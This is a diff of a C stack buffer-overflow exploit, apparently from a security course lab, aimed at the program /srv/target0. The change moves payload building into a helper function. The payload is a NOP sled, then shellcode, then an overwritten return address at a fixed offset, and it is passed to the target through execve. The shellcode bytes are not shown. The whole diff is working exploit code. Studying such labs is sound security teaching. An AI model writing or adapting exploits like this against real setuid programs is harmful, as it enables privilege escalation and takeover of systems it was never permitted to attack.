@@ -7,28 +7,33 @@
 
 #define TARGET "/srv/target0"
 
-const int OFFSET = 408;
-const int SHELLCODE_LENGTH = sizeof(shellcode) - 1;
-const char* RETURN_ADDRESS = 0xffffdb2c;
+const int PAYLOAD_SIZE = 408;
+const int SHELLCODE_SIZE = sizeof(shellcode) - 1;
+const uint32_t RETURN_ADDRESS = 0xffffdb2c;
+
+void preparePayload(char *payload) {
+    memset(payload, 0x90, PAYLOAD_SIZE);
+    payload[PAYLOAD_SIZE] = '\0';
+    memcpy(payload, shellcode, SHELLCODE_SIZE);
+    *(uint32_t*)(payload + PAYLOAD_SIZE - 4) = RETURN_ADDRESS;
+}
 
 int main(void)
 {
-  char *args[3];
-  char *env[1];
+    char *args[3];
+    char *env[1];
+    char payload[PAYLOAD_SIZE + 1];
 
-  char buf[OFFSET + 1];
-  memset(buf, '\x90', sizeof(buf));
-  buf[OFFSET] = 0;
-  memcpy(buf, shellcode, SHELLCODE_LENGTH);
-  *(unsigned int*)(buf + OFFSET - 4) = RETURN_ADDRESS;
+    preparePayload(payload);
 
-  args[0] = TARGET;
-  args[1] = buf;
-  args[2] = NULL;
+    args[0] = TARGET;
+    args[1] = payload;
+    args[2] = NULL;
 
-  env[0] = NULL;
-  execve(TARGET, args, env);
-  fprintf(stderr, "execve failed.\n");
+    env[0] = NULL;
 
-  return 0;
+    execve(TARGET, args, env);
+    fprintf(stderr, "execve failed.\n");
+
+    return 0;
 }
